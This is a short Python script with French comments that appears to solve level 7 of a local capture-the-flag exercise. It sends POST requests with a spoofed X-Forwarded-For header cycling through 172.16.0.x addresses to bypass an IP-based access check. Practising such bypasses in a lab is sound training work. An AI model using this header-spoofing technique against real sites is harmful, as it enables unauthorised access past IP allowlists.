import requests

# URL de votre serveur web local
url = "http://localhost/2bgp-ctf/levels/7/index.php"

# Données à envoyer (peuvent être vides ou contenir des paramètres de formulaire)
data = {}

# Boucle pour générer chaque adresse IP de 172.16.0.0 à 172.16.0.254
for i in range(255):
    fake_ip = f"172.16.0.{i}"

    # En-têtes HTTP avec l'adresse IP falsifiée
    headers = {
        "X-Forwarded-For": fake_ip
    }

    try:
        # Envoi de la requête POST
        response = requests.post(url, headers=headers, data=data, allow_redirects=True)

        # Vérification du statut de la réponse
        if response.status_code == 404:
            print(f"Erreur 404 pour l'IP {fake_ip}: L'URL spécifiée n'a pas été trouvée sur le serveur.")
        else:
            # Vérification si une redirection a eu lieu
            if response.history:
                print(f"Redirection réalisée pour l'IP {fake_ip}")
                print(f"Final URL pour l'IP {fake_ip}: {response.url}")
                print(f"Response Text pour l'IP {fake_ip}: {response.text}")
                break  # Arrête le script si une redirection a eu lieu
            else:
                print(f"PAS ACCESS pour l'IP {fake_ip}")
    except requests.exceptions.RequestException as e:
        print(f"Une erreur s'est produite pour l'IP {fake_ip}: {e}")
